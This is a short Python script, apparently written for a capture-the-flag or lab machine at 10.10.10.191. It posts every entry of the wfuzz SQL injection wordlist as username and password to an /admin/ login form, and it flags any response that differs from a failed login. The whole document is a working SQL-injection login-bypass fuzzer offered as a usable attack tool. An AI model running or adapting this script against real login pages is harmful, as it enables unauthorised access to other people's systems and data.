
import requests
url="http://10.10.10.191/admin/"
def login(username,pwd):
	data={"username":username,"password":pwd}
	r=requests.post(url,data)
	return r.text
r=open("/usr/share/wfuzz/wordlist/Injections/SQL.txt","r")
data=r.readlines()	

temp=login("admin","admin")[300:400]
print(temp)
for i in data:
	print("testing on",i)
	t=login(i,i)
	if(temp not  in t):
		print(t)
